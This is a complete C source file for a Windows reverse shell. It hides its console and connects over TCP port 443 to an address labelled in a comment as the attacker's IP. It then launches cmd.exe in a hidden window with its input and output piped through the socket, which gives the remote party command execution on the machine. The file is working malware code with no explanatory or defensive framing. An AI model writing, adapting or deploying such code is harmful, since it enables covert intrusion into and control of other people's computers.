#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    FreeConsole();  // Hide the console
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = htons(443);  // Remote listener port
    srv.sin_addr.s_addr = inet_addr("192.168.96.129");  // Attackers IP

    // Connect to remote server
    if (connect(s, (sockaddr*)&srv, sizeof(srv)) == SOCKET_ERROR) return 0;

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide the CMD window
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    PROCESS_INFORMATION pi;
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    closesocket(s);
    WSACleanup();
}
